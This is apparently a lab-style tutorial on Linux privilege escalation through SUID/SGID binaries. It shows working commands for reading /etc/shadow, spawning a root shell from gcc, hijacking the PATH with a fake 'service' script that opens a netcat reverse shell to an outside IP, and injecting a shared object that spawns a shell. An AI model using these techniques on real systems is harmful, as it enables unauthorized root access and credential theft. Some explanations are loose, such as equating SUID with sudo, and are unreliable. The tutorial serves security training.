**Misusing SUID/SGID Permission**

SUID → Set User ID. Its a special permission in Linux/Unix file systems that allows a program to run with the permissions of the file owner, rather than the user who executes it. Normally, when you run a program, it executes with your user privileges. 
If a file has the SUID bit set, and you run it, the program runs with the owner’s privileges.

<img width="804" height="162" alt="image" src="https://github.com/user-attachments/assets/79b098a5-5ced-4911-8c98-ff8de6d455e3" />

The owner of this file is root. We can see that SUID is set on this (s). So if any user runs this file, it will run as root (owner) privilege.

**How to find SUIDs on a system**

***find / -type f -perm -u=s 2>/dev/null***

***find / -type f -perm -4000 2>/dev/null***

find / → Search starting from the root directory.

-perm -4000 → Match files with the SUID permission bit set.

-type f → Only look for regular files (not directories).

2>/dev/null → Suppress permission-denied errors

<img width="786" height="335" alt="image" src="https://github.com/user-attachments/assets/aea479ed-86fd-4ab4-924d-383d263d11e0" />

These are the files where SUID are set. Now we need to find from which file we can perform privilege escalations.

**1. With the help of intended functionality.**

<img width="786" height="476" alt="image" src="https://github.com/user-attachments/assets/7fd3d6e3-0453-4e87-ab98-e77c4e3bf1f8" />

cat command is used to display the content of any file. It don’t have any other functionality.

<img width="786" height="114" alt="image" src="https://github.com/user-attachments/assets/70456784-9c2a-4c5f-ad73-280347991fb3" />

Any file is in red, it means SUID is set on it. We can also see ‘s’. The owner of this file is root. So if any user will run this file, it will run with its owner (root) privilege.

So here we can read any file in the system with cat command as the owner of the file is root and SUID is set on it.

In that case we can read /etc/shadow file and get the hash of root.

<img width="786" height="194" alt="image" src="https://github.com/user-attachments/assets/3185c3d1-7e19-4f00-817c-626df39d48ff" />

**2. Shell escaping**

<img width="786" height="223" alt="image" src="https://github.com/user-attachments/assets/64a55080-326a-4c14-a4f3-931677b5c76a" />

On gcc, SUID is set. gcc is a compiler system primarily used for compiling programs written in languages C, C++ etc. Its intended functionality is to compile.

Now in gcc there is an option to execute any command.

https://gtfobins.org/

<img width="828" height="260" alt="image" src="https://github.com/user-attachments/assets/a6f73dc3-7479-40e1-8533-d483a1808773" />

Now, here we cant find SUID option. In that case we can use Sudo option. There is no difference between SUID and Sudo. To run any command with privilege of its owner we write sudo. And if SUID is set there is no need to write sudo.

<img width="786" height="152" alt="image" src="https://github.com/user-attachments/assets/82864f8b-f9a6-47f8-a37d-bd60d2fb705a" />

***gcc -wrapper /bin/sh, -s .***

<img width="786" height="158" alt="image" src="https://github.com/user-attachments/assets/a78d5540-1065-4b32-b90f-41ecc2c2887a" />

Here, euid (effective user ID) is 0 (root) and uid is 1000 (user)

Now, if we take any shell with the help of SUID, uid and euid will be different.

uid is for the user. I am still the user user. But for gcc process the euid is root. Originally I am still user.

**3. PATH variable injection**

<img width="786" height="317" alt="image" src="https://github.com/user-attachments/assets/cdfe366d-6b2f-45a8-9745-962e2a30abf3" />

<img width="786" height="117" alt="image" src="https://github.com/user-attachments/assets/4e56965f-7aa1-4a02-9bb1-053d55b1c305" />

Now we need to check if this file is calling any command or not.

<img width="786" height="462" alt="image" src="https://github.com/user-attachments/assets/773ce246-8556-4b9a-aaa2-ead56d19946b" />

The strings command in Linux is used to extract readable text strings from binary files (like executables, object files, or any non-text file). It’s very useful for analyzing compiled programs or unknown files.

We found that service command is starting apache2. Now here there is no path given for service command.

<img width="786" height="440" alt="image" src="https://github.com/user-attachments/assets/b2eb96f3-f5d3-42b0-9534-0af4d08ce2da" />

env command will show all the environment variables are set for the shell.

***PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin***

This path variable will decide where we can find any command.

Now when we run the file suid-env it dont know where exactly is the service. So it will look into each folder of environment variable and once found it will run it.

Now the folders set in the PATH variable are system folder.

**/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin**

A normal user dont have privilege to write in these folders. So we cannot create a command same as service in these folders.

However we can control this PATH variable. We can add a path of any folder where we have write access in the PATH variable.

<img width="676" height="151" alt="image" src="https://github.com/user-attachments/assets/fe02b9db-a1c1-48ab-91e7-3bf416343118" />

Currently we are in /home/user directory where we have write permission.

So we will create a file having same name service and put some code in it that will give reverse shell.

**echo -e ‘#!/bin/sh\nnc 10.49.100.172 4444 -e /bin/sh’ > service**

<img width="786" height="168" alt="image" src="https://github.com/user-attachments/assets/ac66a968-c9f6-4924-b3a7-ffec06178119" />

Lets start a netcat listener

<img width="744" height="163" alt="image" src="https://github.com/user-attachments/assets/3239dd03-8fba-4fa7-b925-c6a27596020e" />

Now we will inject /home/user in the PATH variable.

<img width="786" height="111" alt="image" src="https://github.com/user-attachments/assets/1b38373e-5bbf-4d1a-9a49-c23b4267def6" />

PATH=/home/user:$PATH

$PATH is the current PATH variable value. So we have added /home/user in the PATH variable.

Now lets run the command

<img width="786" height="85" alt="image" src="https://github.com/user-attachments/assets/519e98a4-ffea-4940-a587-934266ea83f3" />

And we got the root user shell.

<img width="786" height="151" alt="image" src="https://github.com/user-attachments/assets/ccbff7b3-0ea7-4692-a29c-e5fb6a297c8c" />

Difference between suid and sgid

<img width="786" height="132" alt="image" src="https://github.com/user-attachments/assets/74cb41f5-6588-4387-92e6-99cf43cbccab" />

SUID is set on ping. The owner is root, so it will run as root privilege.

If ‘s’ is in the group bit, it means sgid is set on the file → drwxr-sr-x

So the file file is in root group and it will always run with the privilege of the group owner, which is root

**find / -perm -2000 -type f 2>/dev/null**

**4. Shared object injection**

**find / -type f -perm -4000 2>/dev/null**

<img width="786" height="292" alt="image" src="https://github.com/user-attachments/assets/fdff8963-93cd-4175-8326-c44c4fed2b88" />

Shared object are the supporting files. It contain compiled code that can be shared by multiple programs at runtime. Instead of each program having its own copy of common functions, they load these functions from .so files.

**strings /usr/local/bin/suid-so**

<img width="730" height="280" alt="image" src="https://github.com/user-attachments/assets/40bea5e2-ea5f-40bb-8e9a-7936ce894484" />

There is a .so file whose location is /home/user and we have write control on this folder. So we can replace the content of the file libcalc.so with reverse shell.

<img width="786" height="481" alt="image" src="https://github.com/user-attachments/assets/a675355d-a1c1-4614-9e85-a05a064007b6" />

Now, it seems there is no folder called .config

Lets create one

***mkdir .config***

<img width="607" height="136" alt="image" src="https://github.com/user-attachments/assets/470a5c9e-3097-40c4-aa53-e4cb535a7746" />

Now, lets write a C code that will give revers shell.

```
void shell () __attribute__((constructor));

void shell () {

system(“/bin/sh”); // system(“bin/bash -p”)

}
```

<img width="664" height="169" alt="image" src="https://github.com/user-attachments/assets/27de457e-12b5-4547-a6e9-48d33fe54db7" />

***gcc -shared -fPIC libcalc.c -o libcalc.so*** > We need to compile the C file with gcc

Now lets run that SUID

<img width="786" height="197" alt="image" src="https://github.com/user-attachments/assets/49909d8b-aab1-41b0-b4a5-20a368b2811a" />

And we are root !!!!
